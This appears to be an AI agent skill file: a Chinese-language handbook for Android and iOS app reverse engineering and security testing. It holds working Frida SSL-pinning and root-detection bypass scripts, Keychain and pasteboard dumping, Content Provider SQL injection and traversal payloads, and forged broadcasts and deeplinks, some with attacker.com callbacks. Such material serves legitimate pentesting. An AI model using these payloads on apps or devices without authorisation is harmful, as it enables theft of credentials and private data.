---
name: reverse-engineering-mobile
description: >
  Complete mobile application reverse engineering and security testing for Android and iOS:
  APK/IPA decompilation, Frida dynamic instrumentation, SSL pinning bypass,
  intent/deeplink exploitation, insecure data storage, Burp Suite traffic interception,
  Flutter analysis, and automated security assessment with MobSF.
  Part A covers attacker techniques against mobile apps;
  Part B covers analysis methodology, tool usage, and security testing.
domain: cybersecurity
subdomain: reverse-engineering
tags: [mobile, android, ios, frida, jadx, apktool, objection, ssl-pinning, flutter, burpsuite, intent, deeplink, mobsf, mobile-security]
version: 2.0.0
---

# 移动应用逆向工程 — 完整攻防手册

## 适用场景

- Android APK 安全分析：反编译、动态插桩、Intent/Deeplink 漏洞利用
- iOS IPA 安全分析：Frida hook、Objection 运行时探索、Keychain 提取
- SSL Pinning 绕过以拦截加密流量
- Flutter 应用特殊分析（libapp.so、Dart 快照）
- 不安全数据存储检测与利用
- Burp Suite 移动流量拦截配置
- 不适用于：桌面二进制逆向（使用 reverse-engineering-binary）

---

## Part A：攻击者视角 — 移动应用攻击

### 1. Android 应用攻击面

#### 1.1 Intent 注入与劫持

Intent 是 Android 组件间通信的核心机制，攻击者可利用隐式/显式 Intent 实现越权访问：

```bash
 # 枚举导出组件
 aapt dump xmltree app.apk AndroidManifest.xml | grep -E "exported|intent-filter"

 # 使用 Drozer 枚举攻击面
 drozer console connect
 dz> run app.package.attackspace com.target.app
 dz> run app.activity.forintent --action android.intent.action.VIEW --data_uri "http://evil.com"

 # 显式 Intent 调用未授权 Activity
 adb shell am start -n com.target.app/.AdminActivity
 adb shell am start -n com.target.app/.DebugActivity --es password "bypass"

 # 隐式 Intent 劫持（恶意应用注册相同 intent-filter）
 # AndroidManifest.xml 中声明：
 # <intent-filter>
 #   <action android:name="com.target.app.CUSTOM_ACTION"/>
 #   <category android:name="android.intent.category.DEFAULT"/>
 # </intent-filter>

 # Intent 重定向攻击
 adb shell am start -n com.target.app/.WebViewActivity \
   --es url "file:///data/data/com.target.app/shared_prefs/config.xml"

 # PendingIntent 劫持（通过修改未指定组件的 PendingIntent）
 dz> run app.broadcast.info -a com.target.app
```

#### 1.2 Deeplink 漏洞利用

```bash
 # 枚举 Deeplink
 aapt dump xmltree app.apk AndroidManifest.xml | grep -A5 "android:scheme"
 adb shell dumpsys package com.target.app | grep -A5 "android:scheme"

 # Scheme 劫持攻击
 adb shell am start -a android.intent.action.VIEW \
   -d "targetscheme://open?url=javascript:alert(document.cookie)"

 # 参数注入
 adb shell am start -a android.intent.action.VIEW \
   -d "targetscheme://webview?file=file:///data/data/com.target.app/databases/users.db"

 # App Link 验证绕过（检查 assetlinks.json 是否可被劫持）
 curl -s "https://target.com/.well-known/assetlinks.json"
 # 若缺少或配置不当，可注册相同域名子域劫持

 # WebView Deeplink RCE 链
 adb shell am start -a android.intent.action.VIEW \
   -d "targetscheme://load?url=@PackageName/webview" \
   --es script "alert(1)"

 # 深层链接枚举脚本
 for scheme in myapp targetapp custom; do
   for host in open webview navigate; do
     for path in url link redirect; do
       adb shell am start -a android.intent.action.VIEW \
         -d "${scheme}://${host}/${path}=https://attacker.com" 2>/dev/null
     done
   done
 done
```

#### 1.3 Content Provider 泄漏

```bash
 # 查询 Content Provider
 adb shell content query --uri content://com.target.app.provider/users
 dz> run scanner.provider.findcontent com.target.app
 dz> run app.provider.query content://com.target.app.provider/credentials

 # SQL 注入
 adb shell content query --uri \
   "content://com.target.app.provider/users' OR '1'='1"
 dz> run scanner.provider.injection -a com.target.app
 dz> run scanner.provider.sqltables -a com.target.app

 # 目录遍历
 adb shell content query --uri \
   "content://com.target.app.provider/..%2F..%2F..%2Fdata%2Fdata%2Fcom.target.app%2Fshared_prefs%2Fconfig.xml"
 dz> run scanner.provider.traversal -a com.target.app
```

#### 1.4 Broadcast Receiver 滥用

```bash
 # 发送伪造广播
 adb shell am broadcast -a com.target.app.CUSTOM_BROADCAST \
   --es action "grant_admin" --es user "attacker"
 dz> run app.broadcast.send --action com.target.app.RESET_PASSWORD \
   --extra string password "newpass123"

 # 本地广播泄漏（LocalBroadcastManager 误用）
 dz> run app.broadcast.info -a com.target.app -f
```

#### 1.5 Task Affinity 劫持与 Tapjacking

```bash
 # Task Affinity 劫持：恶意应用设置相同 taskAffinity
 # AndroidManifest.xml:
 # <activity android:name=".MaliciousActivity"
 #   android:taskAffinity="com.target.app">
 # </activity>

 # Tapjacking（覆盖攻击）
 # 使用透明 Activity 覆盖目标应用 UI
 # 设置 android:filterTouchesWhenObscured="true" 可防御
```

### 2. iOS 应用攻击面

#### 2.1 URL Scheme 劫持

```bash
 # 枚举 URL Scheme
 plutil -p Info.plist | grep -A5 CFBundleURLSchemes

 # 调用 URL Scheme
 # 越狱设备：
 openurl targetscheme://action?param=value
 # 或通过 Frida：
 frida -U -n "TargetApp" -e '
   ObjC.classes.LSApplicationWorkspace.defaultWorkspace()
     .openSensitiveURL_withOptions_(
       ObjC.classes.NSURL.URLWithString_("targetscheme://open?url=evil"),
       null
     );
 '

 # 通用链接滥用
 # 检查 apple-app-site-association 文件
 curl -s "https://target.com/apple-app-site-association" | python3 -m json.tool
 # 若配置不当或子域可被接管，可劫持 Universal Link
```

#### 2.2 Pasteboard 与 Keychain 数据泄漏

```javascript
 // 监控剪贴板
 frida -U -n "TargetApp" -e '
   var UIPasteboard = ObjC.classes.UIPasteboard;
   var pb = UIPasteboard.generalPasteboard();
   setInterval(function() {
     var str = pb.string();
     if (str) console.log("[Pasteboard] " + str.toString());
   }, 1000);
 '
```

```bash
 # Keychain 数据提取
 objection -g "TargetApp" explore
 ios keychain dump
 ios keychain dump --json > keychain.json

 # 检查 NSUserDefaults
 frida -U -n "TargetApp" -e '
   var NSUD = ObjC.classes.NSUserDefaults;
   var defaults = NSUD.alloc().init();
   var dict = defaults.dictionaryRepresentation();
   console.log(dict.toString());
 '
```

#### 2.3 CoreData SQLite 提取

```bash
 # 越狱设备上提取 CoreData 数据库
 find /var/mobile/Containers/Data/Application/*/Library/ -name "*.sqlite"
 # 复制到本地
 scp root@device:/var/mobile/Containers/Data/Application/<UUID>/Library/Application\ Support/database.sqlite .
 sqlite3 database.sqlite ".tables"
 sqlite3 database.sqlite "SELECT * FROM ZUSER;"
```

#### 2.4 LLDB 动态调试

```bash
 # 附加到进程
 debugserver *:1234 --attach="TargetApp"
 lldb
 (lldb) process connect connect://device-ip:1234

 # 断点与 Hook
 (lldb) breakpoint set -n "-[ViewController validateLogin:]"
 (lldb) breakpoint set -r "password"
 (lldb) script import frida

 # Cycript 替代方案（通过 Frida）
 frida -U -n "TargetApp" -e '
   var vc = ObjC.classes.ViewController.alloc().init();
   console.log(vc.secretMethod_());
 '
```

### 3. 不安全数据存储

#### 3.1 Android 不安全存储

```bash
 # SharedPreferences 明文检测
 adb shell run-as com.target.app cat shared_prefs/*.xml
 adb shell "find /data/data/com.target.app/ -name '*.xml' -exec cat {} \;"

 # SQLite 数据库暴露
 adb shell run-as com.target.app sqlite3 databases/app.db ".dump"
 adb shell run-as com.target.app sqlite3 databases/app.db \
   "SELECT * FROM users WHERE role='admin';"

 # 外部存储 (SD 卡) 文件暴露
 adb shell ls -la /sdcard/Android/data/com.target.app/
 adb shell cat /sdcard/Android/data/com.target.app/cache/config.json
 adb shell cat /sdcard/Android/data/com.target.app/files/.hidden_token

 # 日志敏感数据
 adb logcat -d | grep -iE "password|token|key|secret|session|cookie" | grep "com.target.app"
 adb logcat -s "com.target.app" | grep -iE "auth|login|credit"

 # 备份数据提取
 adb backup -f backup.ab com.target.app
 dd if=backup.ab bs=1 skip=24 | openssl zlib -d > backup.tar
 tar xf backup.tar
 # 或使用 Android Backup Extractor
 java -jar abe.jar unpack backup.ab backup.tar ""
```

#### 3.2 源码中的硬编码凭证

```bash
 # APK 反编译后搜索
 jadx -d output app.apk
 grep -rnriE "(password|api_key|secret|token|AWS_KEY)" output/ --include="*.java"
 grep -rnriE "(AIza[0-9A-Za-z\-_]{35}|AKIA[0-9A-Z]{16})" output/
 grep -rnriE "(BEGIN (RSA |DSA )?PRIVATE KEY)" output/

 # 使用 MobSF 自动检测
 python3 manage.py runserver
 # 上传 APK，自动检测硬编码凭证

 # 字符串搜索
 strings lib/arm64-v8a/*.so | grep -iE "api_key|secret|password"
 strings lib/arm64-v8a/*.so | grep -E "eyJ[A-Za-z0-9-_]+" # JWT tokens
```

#### 3.3 iOS 不安全存储

```bash
 # Keychain 分析（见 2.2 节）
 # NSUserDefaults 分析
 objection -g "TargetApp" explore
 ios nsuserdefaults get

 # 文件系统检查
 find /var/mobile/Containers/Data/Application/<UUID>/ -name "*.plist" -exec plutil -p {} \;
 find /var/mobile/Containers/Data/Application/<UUID>/ -name "*.sqlite" -exec echo {} \;

 # 缓存与快照泄漏
 # 应用切换时系统自动截图保存在 Library/Caches/Snapshots/
 find /var/mobile/Containers/Data/Application/<UUID>/Library/Caches/Snapshots/ -type f
```

### 4. Flutter 应用特殊分析

#### 4.1 libapp.so 分析

```bash
 # 检测 Flutter 应用
 unzip -l app.apk | grep "libapp.so"
 # 若存在 lib/arm64-v8a/libapp.so，则为 Flutter 应用

 # 提取 libapp.so
 unzip -o app.apk lib/arm64-v8a/libapp.so -d flutter_extract/

 # Dart 快照分析
 strings libapp.so | grep -E "^[A-Za-z_][A-Za-z0-9_]*$" | sort -u | head -100

 # Blutter Dart 符号恢复（推荐）
 # 安装 Blutter
 pip install blutter
 blutter flutter_extract/lib/arm64-v8a/ output_blutter/
 # 输出: asm/ (反汇编), scripts/ (Frida 脚本), pp.txt (对象池)

 # 使用 Blutter 输出进行分析
 grep -i "login\|auth\|token\|verify\|check" output_blutter/pp.txt
 grep -i "vip\|premium\|license\|subscribe" output_blutter/pp.txt
```

#### 4.2 Flutter SSL Pinning 绕过

```bash
 # 方法 1: reFlutter 工具
 pip install refutter
 reflutter app.apk
 # 选择 "Traffic monitoring and analysis" 或 "SSL pinning bypass"
 # 重新签名后安装

 # 方法 2: Frida-gum Hook (基于 Blutter 输出)
 # 找到 SSL 相关 Dart 函数地址
 grep -i "ssl\|certificate\|handshake\|x509" output_blutter/pp.txt

 # 方法 3: 修改 libflutter.so（patch ssl_client 函数）
 # 使用 flutter_ssl_offset_v2 工具定位并 patch
```

#### 4.3 Flutter Frida Hook 脚本

```javascript
 // Flutter Dart 函数 Hook（基于 Blutter 输出的地址）
 // flutter_hook.js
 var libapp = Module.findBaseAddress("libapp.so");
 if (libapp) {
   // 替换为 Blutter 输出的实际偏移
   var targetOffset = 0xA716A8;
   var targetAddr = libapp.add(targetOffset);

   Interceptor.attach(targetAddr, {
     onEnter: function(args) {
       console.log("[+] Flutter function at " + targetOffset + " called");
       console.log("    arg0: " + args[0]);
       console.log("    arg1: " + args[1]);
     },
     onLeave: function(retval) {
       console.log("[+] Return value: " + retval);
       // 修改返回值（如 VIP 验证）
       // retval.replace(ptr(0x1)); // 返回 true
     }
   });
 }
 // frida -U -f com.target.app -l flutter_hook.js
```

---

## Part B：防御者/分析师视角 — 移动逆向工作流

### 5. Android 静态分析

#### 5.1 APK 解包与反编译

```bash
# apktool 反编译（资源 + smali）
apktool d app.apk -o apk_output/
# 关键文件:
#   apk_output/AndroidManifest.xml  — 权限、组件、配置
#   apk_output/smali/               — Dalvik 字节码（可编辑）
#   apk_output/res/                 — 资源文件
#   apk_output/lib/                 — Native 库
#   apk_output/assets/              — 资产文件

# 分析 AndroidManifest.xml
grep -E "exported|permission|intent-filter|provider|authority" \
  apk_output/AndroidManifest.xml
# 重点关注:
#   android:exported="true" 的组件
#   自定义权限保护级别
#   debuggable="true"
#   allowBackup="true"
#   networkSecurityConfig

# jadx 反编译（Java 源码）
jadx -d jadx_output/ app.apk
jadx-gui app.apk  # GUI 模式，支持搜索与导航
# 搜索关键字符串:
#   password, token, api_key, secret, http://, https://
#   cipher, encrypt, decrypt, hash, md5, sha
#   WebView, loadUrl, addJavascriptInterface

# dex2jar + JD-GUI（备用方案）
d2j-dex2jar.sh app.apk -o app-dex2jar.jar
jd-gui app-dex2jar.jar

# baksmali 直接反汇编
baksmali d app.apk -o smali_output/

# 字符串资源提取（可能包含端点 URL）
find apk_output/res/values/ -name "strings.xml" -exec cat {} \;
grep -r "http" apk_output/res/values/strings.xml

# 重新打包与签名（修改后）
apktool b apk_output/ -o modified.apk
# 签名
keytool -genkey -v -keystore debug.keystore -alias debug \
  -keyalg RSA -keysize 2048 -validity 10000
jarsigner -sigalg SHA256withRSA -digestalg SHA-256 \
  -keystore debug.keystore modified.apk debug
# 或使用 apksigner
zipalign -v 4 modified.apk modified-aligned.apk
apksigner sign --ks debug.keystore --out final.apk modified-aligned.apk
```

#### 5.2 APK 解包与 DUMP（加固/加壳应用）

```bash
# 检测加壳（常见加固厂商特征）
unzip -l app.apk | grep -iE "bangcle|ijiami|360|tencent|baidu|qihoo|secneo"
strings app.apk | grep -iE "bangcle|ijiami|360jiagu|tencent"

# 方法 1: Frida + FRIDA-DEX-DUMP（内存 dump）
pip install frida-dex-dump
# 运行应用后执行
frida-dex-dump -U -f com.target.app -o dumped/
# 或附加到运行中的进程
frida-dex-dump -U -n "TargetApp" -o dumped/

# 方法 2: Frida 脚本手动 dump DEX
frida -U -n "TargetApp" -e '
  Java.perform(function() {
    Java.enumerateClassLoaders({
      onMatch: function(loader) {
        try {
          loader.loadClass("com.target.app.MainActivity");
          console.log("[+] Found target classloader: " + loader);
        } catch(e) {}
      },
      onComplete: function() {}
    });
  });
'

# 方法 3: 使用 FART（ART 虚拟机级脱壳工具）
# 需要定制 ROM 或 Magisk 模块

# 方法 4: BlackDex（无需 Root）
# 安装 BlackDex APK，选择目标应用进行脱壳
# 输出路径: /sdcard/BlackDex/com.target.app/

# 方法 5: 使用 Xposed 模块
# FDex2 / DexExtractor 模块
```

#### 5.3 自动化安全扫描

```bash
# MobSF（Mobile Security Framework）
# 安装
git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
cd Mobile-Security-Framework-MobSF
docker build -t mobsf .
docker run -it -p 8000:8000 mobsf
# 或本地安装
pip install -r requirements.txt
python3 manage.py runserver 0.0.0.0:8000

# 上传 APK 进行自动化分析
# 自动检测:
#   - 硬编码凭证、API 密钥
#   - 不安全数据存储
#   - 组件导出问题
#   - 权限过度申请
#   - 加密算法弱点
#   - WebView 漏洞
#   - 证书分析

# Drozer（交互式 Android 安全测试框架）
# 安装
pip install drozer
# 启动 Agent（设备端）
adb install drozer-agent.apk
# 连接
adb forward tcp:31415 tcp:31415
drozer console connect

# Drozer 常用模块
dz> run app.package.list -f target          # 搜索包
dz> run app.package.info -a com.target.app  # 包信息
dz> run app.package.attacksurface com.target.app  # 攻击面
dz> run app.activity.info -a com.target.app       # Activity 信息
dz> run app.activity.start --component com.target.app .AdminActivity
dz> run scanner.provider.findcontent -p com.target.app  # Provider 枚举
dz> run scanner.provider.injection -a com.target.app    # SQL 注入扫描
dz> run scanner.provider.traversal -a com.target.app    # 目录遍历扫描
```

### 6. Android 动态分析

#### 6.1 环境准备

```bash
# 模拟器选项
# 选项 1: Genymotion（推荐，自带 Root）
# 下载: https://www.genymotion.com/download/
# 安装后创建 ARM 兼容镜像

# 选项 2: Android Studio AVD
# 选择不含 Google Play 的镜像（便于 Root）
# 推荐镜像: Android 12/13 API 33, x86_64

# 选项 3: 物理设备 + Magisk
# 解锁 Bootloader
fastboot oem unlock
# 安装 Magisk
# 1. 下载设备对应 ROM 的 boot.img
# 2. 使用 Magisk App 修补 boot.img
# 3. fastboot flash boot magisk_patched.img
# 4. fastboot reboot

# Frida Server 安装（Root 设备）
# 确认架构
adb shell getprop ro.product.cpu.abi
# 下载对应版本
wget https://github.com/frida/frida/releases/latest/download/frida-server-16.x.x-android-arm64.xz
xz -d frida-server-*.xz
adb push frida-server-* /data/local/tmp/frida-server
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "su -c /data/local/tmp/frida-server &"

# Xposed Framework（可选，通过 Magisk 模块）
# 安装 LSPosed (EdXposed 已停止维护)
# Magisk Manager -> 模块 -> 安装 LSPosed

# 设备验证
frida-ps -U          # 列出进程
frida-ps -Ua         # 列出应用
adb devices           # 确认连接
```

#### 6.2 Frida 动态插桩

```javascript
// === Frida 基础 Hook 模板 ===
// basic_hook.js

// Hook Java 方法
Java.perform(function() {
  var LoginActivity = Java.use("com.target.app.LoginActivity");
  LoginActivity.validateLogin.implementation = function(user, pass) {
    console.log("[+] validateLogin called");
    console.log("    user: " + user);
    console.log("    pass: " + pass);
    return this.validateLogin(user, pass);
  };
});

// Hook 所有重载方法
Java.perform(function() {
  var Target = Java.use("com.target.app.Crypto");
  Target.encrypt.overload("[B", "java.lang.String").implementation = function(data, key) {
    console.log("[+] encrypt(byte[], String) called");
    console.log("    key: " + key);
    return this.encrypt(data, key);
  };
  // Hook 所有重载
  var overloads = Target.encrypt.overloads;
  for (var i = 0; i < overloads.length; i++) {
    overloads[i].implementation = function() {
      console.log("[+] encrypt overloaded method called, args: " + arguments.length);
      for (var j = 0; j < arguments.length; j++) {
        console.log("    arg" + j + ": " + arguments[j]);
      }
      return this.encrypt.apply(this, arguments);
    };
  }
});

// Hook Native 函数
Interceptor.attach(Module.findExportByName("libnative.so", "AES_encrypt"), {
  onEnter: function(args) {
    console.log("[+] AES_encrypt called");
    console.log("    input ptr: " + args[0]);
    console.log("    key ptr: " + args[1]);
    console.log("    input hex: " + hexdump(args[0], {length: 32}));
  },
  onLeave: function(retval) {
    console.log("[+] AES_encrypt returned: " + retval);
  }
});

// frida -U -f com.target.app -l basic_hook.js --no-pause
```

```javascript
// === Root 检测绕过 ===
// bypass_root.js
Java.perform(function() {
  // 绕过常见 Root 检测库
  var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
  RootBeer.isRooted.implementation = function() { return false; };
  RootBeer.isRootedWithBusyBoxCheck.implementation = function() { return false; };

  // 绕过文件检测
  var File = Java.use("java.io.File");
  File.exists.implementation = function() {
    var path = this.getAbsolutePath();
    var rootPaths = ["/sbin/su", "/system/bin/su", "/system/xbin/su",
                     "/data/local/xbin/su", "/data/local/bin/su",
                     "/system/sd/xbin/su", "/system/app/Superuser.apk",
                     "/system/app/SuperSU.apk", "/magisk/.core/bin/su"];
    for (var i = 0; i < rootPaths.length; i++) {
      if (path.indexOf(rootPaths[i]) >= 0) return false;
    }
    return this.exists();
  };

  // 绕过 PackageManager 检测
  var PackageManager = Java.use("android.app.ApplicationPackageManager");
  PackageManager.getPackageInfo.overload("java.lang.String", "int").implementation = function(name, flags) {
    var rootPkgs = ["com.noshufou.android.su", "eu.chainfire.supersu",
                    "com.topjohnwu.magisk", "com.koushikdutta.superuser"];
    for (var i = 0; i < rootPkgs.length; i++) {
      if (name === rootPkgs[i]) {
        throw Java.use("android.content.pm.PackageManager$NameNotFoundException").$new();
      }
    }
    return this.getPackageInfo(name, flags);
  };
});
// frida -U -f com.target.app -l bypass_root.js
```

```javascript
// === SSL Pinning 通用绕过 ===
// ssl_bypass.js
Java.perform(function() {
  // 方法 1: TrustManager 绕过
  var TrustManager = Java.use("javax.net.ssl.X509TrustManager");
  var SSLContext = Java.use("javax.net.ssl.SSLContext");
  var X509TrustManager = Java.registerClass({
    name: "com.bypass.TrustManager",
    implements: [TrustManager],
    methods: {
      checkClientTrusted: function(chain, authType) {},
      checkServerTrusted: function(chain, authType) {},
      getAcceptedIssuers: function() { return []; }
    }
  });
  var trustManagers = [X509TrustManager.$new()];
  var sslContext = SSLContext.getInstance("TLS");
  sslContext.init(null, trustManagers, null);
  SSLContext.setDefault(sslContext);

  // 方法 2: OkHttp CertificatePinner 绕过
  try {
    var CertificatePinner = Java.use("okhttp3.CertificatePinner");
    CertificatePinner.check.overload("java.lang.String", "java.util.List").implementation = function(host, peerCerts) {
      console.log("[+] OkHttp CertificatePinner bypassed for: " + host);
    };
    CertificatePinner.check.overload("java.lang.String", "[Ljava.security.cert.Certificate;").implementation = function(host, peerCerts) {
      console.log("[+] OkHttp CertificatePinner bypassed for: " + host);
    };
  } catch(e) { console.log("[-] OkHttp not found"); }

  // 方法 3: WebViewClient SSL 错误绕过
  var WebViewClient = Java.use("android.webkit.WebViewClient");
  WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {
    console.log("[+] WebView SSL error bypassed");
    handler.proceed();
  };

  // 方法 4: WebViewClient TLS 绕过（自定义类）
  try {
    var CustomWebViewClient = Java.use("com.target.app.CustomWebViewClient");
    CustomWebViewClient.onReceivedSslError.implementation = function(view, handler, error) {
      handler.proceed();
    };
  } catch(e) {}
});
// frida -U -f com.target.app -l ssl_bypass.js
```

#### 6.3 Intent 与 Deeplink 测试

```bash
# ADB Intent 测试
# 启动未导出 Activity（若 debuggable 或 permissions 允许）
adb shell am start -n com.target.app/.InternalActivity
adb shell am start -n com.target.app/.AdminPanel --es role "admin"

# 发送广播
adb shell am broadcast -a com.target.app.ACTION_TOKEN_REFRESH \
  --es token "injected_token"
adb shell am broadcast -a com.target.app.ACTION_SET_FLAG \
  --ez is_vip true

# 调用 Content Provider
adb shell content query --uri content://com.target.app.provider/users
adb shell content insert --uri content://com.target.app.provider/users \
  --bind name:s:attacker --bind role:s:admin

# Deeplink 测试
adb shell am start -a android.intent.action.VIEW \
  -d "targetscheme://path?param1=value1&param2=value2"
adb shell am start -a android.intent.action.VIEW \
  -d "https://target.com/deep/page?id=1' OR '1'='1"

# Drozer Intent Fuzzing
dz> run app.activity.start --component com.target.app .WebActivity \
  --extra string url "file:///etc/hosts"
dz> run scanner.provider.findcontent -p com.target.app
dz> run app.broadcast.send --action com.target.app.CUSTOM \
  --extra string cmd "id" --extra string callback "http://attacker.com"

# Pending Intent 利用
adb shell am start -n com.target.app/.NotificationActivity \
  --ei notification_id 1 --es action "grant_permission"
```

### 7. iOS 静态分析

#### 7.1 IPA 解包与二进制分析

```bash
# IPA 提取（从设备获取解密的 IPA）
# 方法 1: Frida 解密（Clutch 替代方案）
frida -U -n "TargetApp" -e '
  var appPath = ObjC.classes.NSBundle.mainBundle().bundlePath();
  console.log("App path: " + appPath.toString());
'

# 方法 2: 使用 bfdecrypt / Clutch（越狱设备）
# bfdecrypt -d com.target.app -o /tmp/decrypted.ipa
# 或 Clutch -d com.target.app

# 解压 IPA
unzip TargetApp.ipa -d ipa_extracted/
# Payload/TargetApp.app/ 为应用包

# class-dump（导出 Objective-C 头文件）
class-dump -H ipa_extracted/Payload/TargetApp.app/TargetApp -o headers/
grep -r "password\|token\|auth\|secret\|API" headers/

# Swift 方法 demangling
nm -gU TargetApp | grep -i "swift" | swift-demangle

# Info.plist 分析
plutil -p ipa_extracted/Payload/TargetApp.app/Info.plist | \
  grep -iE "url\|scheme\|ats\|security\|transport"

# ATS（App Transport Security）检查
plutil -p Info.plist | grep -A10 NSAppTransportSecurity
# 关注:
#   NSAllowsArbitraryLoads = true  (允许 HTTP)
#   NSAllowsLocalNetworking = true
#   NSExceptionDomains 配置

# 二进制分析（Ghidra/IDA）
# 加载 Mach-O 二进制到 Ghidra
# 搜索关键字符串: password, token, key, encrypt
# 分析加密函数: CCCrypt, SecKeyEncrypt, SecKeyCreateDecryptedData
```

#### 7.2 Objection 运行时探索

```bash
# 安装与启动
pip install objection
# 注入到已运行应用
objection -g "TargetApp" explore
# 或 spawn 模式
objection -g "TargetApp" explore --startup-command "ios keychain dump"

# 运行时探索
# 列出类与方法
ios hooking list classes
ios hooking list class_methods UIViewController
ios hooking search classes login
ios hooking search classes password

# SSL Pinning 绕过
ios sslpinning disable

# Keychain 操作
ios keychain dump
ios keychain dump --json > keychain_export.json
# 检查条目:
#   kSecAttrAccessible = kSecAttrAccessibleAlways (不安全)
#   kSecAttrAccessible = kSecAttrAccessibleAfterFirstUnlock (较安全)

# Pasteboard 监控
ios pasteboard monitor
ios pasteboard get

# 截图保护绕过
ios ui screenshot disable

# 环境信息
ios info binary
ios bundles list_frameworks

# SQLite 数据库浏览
sqlite connect /path/to/database.sqlite
sqlite execute "SELECT * FROM users;"

# Frida 自定义脚本执行
objection -g "TargetApp" explore --script custom_hook.js
```

### 8. SSL Pinning 绕过

#### 8.1 Android SSL Pinning 绕过

```bash
# 方法 1: Frida 脚本（见 6.2 节 ssl_bypass.js）
frida -U -f com.target.app -l ssl_bypass.js

# 方法 2: Xposed 模块（SSLUnpinning / TrustMeAlready）
# 在 LSPosed 中启用模块，勾选目标应用
# 推荐: TrustMeAlready (支持 OkHttp, Apache HTTPClient, etc.)

# 方法 3: network_security_config.xml 修改
# apktool d app.apk
# 编辑 res/xml/network_security_config.xml:
# <network-security-config>
#   <base-config cleartextTrafficPermitted="true">
#     <trust-anchors>
#       <certificates src="system" />
#       <certificates src="user" />
#     </trust-anchors>
#   </base-config>
# </network-security-config>
# 在 AndroidManifest.xml 添加:
# android:networkSecurityConfig="@xml/network_security_config"
# apktool b -o modified.apk && 签名

# 方法 4: JustTrustMe (Xposed 模块)
# 安装 JustTrustMe.apk
# LSPosed -> 模块 -> JustTrustMe -> 勾选目标应用

# 方法 5: 自定义 TrustManager Hook（见 6.2 节 Frida 脚本）
```

#### 8.2 iOS SSL Pinning 绕过

```bash
# 方法 1: SSL Kill Switch 2（越狱设备）
# 安装: Cydia -> 搜索 "SSL Kill Switch 2"
# 重启 SpringBoard
killall -HUP SpringBoard

# 方法 2: Frida 脚本
frida -U -n "TargetApp" -e '
  if (ObjC.available) {
    // 绕过 iOS SSL Pinning
    Interceptor.attach(
      ObjC.classes.NSURLSession[
        "- URLSession:task:didReceiveChallenge:completionHandler:"
      ].implementation,
      {
        onEnter: function(args) {
          var handler = new ObjC.Block(args[4]);
          handler.implementation(0, ObjC.classes.NSURLCredential.alloc().init());
        }
      }
    );
  }
'

# 方法 3: Objection
objection -g "TargetApp" explore
ios sslpinning disable

# 方法 4: TrustKit 绕过
frida -U -n "TargetApp" -e '
  try {
    var TrustKit = ObjC.classes.TrustKit;
    TrustKit.setForceSSLPinValidationForAllDomains_(0);
  } catch(e) { console.log("TrustKit not found"); }
'

# 方法 5: ATS 降级（修改 Info.plist）
# <key>NSAppTransportSecurity</key>
# <dict>
#   <key>NSAllowsArbitraryLoads</key>
#   <true/>
# </dict>
```

#### 8.3 Flutter SSL Pinning 绕过

```bash
# 方法 1: reFlutter（见 4.2 节）

# 方法 2: 基于 Frida + 偏移的 Hook
# 先用 Blutter 分析 libapp.so 找到 SSL 相关函数
# 然后使用 Frida Interceptor.attach hook 偏移地址

# 方法 3: 替换 libflutter.so
# 某些旧版 Flutter 应用可替换为不验证证书的 libflutter.so
# 需匹配版本号:
 strings libflutter.so | grep "Flutter version"
```

### 9. Burp Suite 移动流量拦截

#### 9.1 Android 代理配置

```bash
# 步骤 1: Burp Suite 代理设置
# Proxy -> Options -> Proxy Listeners -> Add
# Bind to port: 8080, Bind to address: All interfaces

# 步骤 2: 获取代理主机 IP
ifconfig | grep "inet " | grep -v 127.0.0.1

# 步骤 3: Android WiFi 代理配置
# 设置 -> WLAN -> 长按已连接网络 -> 修改网络 -> 高级选项 -> 代理 -> 手动
# 主机名: <代理IP>
# 端口: 8080

# 步骤 4: 安装 CA 证书
# 导出 Burp CA 证书: http://burp/cert (在手机浏览器打开)
# 或: PortSwigger CA -> Export certificate -> DER format
# Android 7+: 需要将证书安装到系统级别
# 转换格式:
openssl x509 -inform DER -in burp_ca.der -out burp_ca.pem
openssl x509 -inform PEM -subject_hash_old -in burp_ca.pem | head -1
# cp burp_ca.pem <hash>.0
# adb push <hash>.0 /system/etc/security/cacerts/
# adb shell chmod 644 /system/etc/security/cacerts/<hash>.0
# adb reboot

# 方法 5: iptables 透明代理（无需 WiFi 代理配置）
adb shell su -c "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080"
adb shell su -c "iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080"

# 方法 6: adb reverse（通过 USB 转发，无需网络配置）
adb reverse tcp:8080 tcp:8080
# 然后在 Android 代理设置中用 127.0.0.1:8080
```

#### 9.2 iOS 代理配置

```bash
# 步骤 1-2: 同 Android（Burp 设置 + 获取 IP）

# 步骤 3: iOS WiFi 代理配置
# 设置 -> Wi-Fi -> 点击已连接网络的 (i) -> 配置代理 -> 手动
# 服务器: <代理IP>
# 端口: 8080

# 步骤 4: 安装 CA 证书
# Safari 打开 http://burp/cert 下载证书
# 设置 -> 通用 -> VPN与设备管理 -> 安装证书
# 设置 -> 通用 -> 关于本机 -> 证书信任设置 -> 启用信任

# iOS 10.3+ 额外步骤: 完全信任根证书
# 设置 -> 通用 -> 关于本机 -> 证书信任设置 -> 开启

# 非 HTTP 流量拦截（TCP/UDP）
# 使用 Burp 的 Invisible Proxying 模式
# Proxy -> Options -> Proxy Listeners -> Edit -> Request handling
# 勾选 "Support invisible proxying"
```

### 10. 数据存储安全分析

```bash
# Android 数据存储审计
# 检查 SharedPreferences
adb shell run-as com.target.app ls -la shared_prefs/
adb shell run-as com.target.app cat shared_prefs/*.xml | \
  grep -iE "token|password|key|session|auth"

# 检查数据库
adb shell run-as com.target.app ls -la databases/
adb shell run-as com.target.app sqlite3 databases/*.db ".schema"
adb shell run-as com.target.app sqlite3 databases/*.db \
  "SELECT * FROM credentials;"

# 检查文件
adb shell run-as com.target.app find . -type f -name "*.json" -exec cat {} \;
adb shell run-as com.target.app find . -type f -name "*.txt" -exec cat {} \;
adb shell run-as com.target.app find . -type f -name "*.key" -exec cat {} \;

# logcat 实时监控
adb logcat -c  # 清空
adb logcat | grep -iE "com.target.app.*(password|token|key|secret|cookie|session)"

# Android Debug Database（查看 Room/SQLite 数据库）
# 在 build.gradle 添加: debugImplementation 'com.amitshekhar.android:debug-db:1.0.6'
# 运行应用后查看: adb logcat | grep "DebugDB"
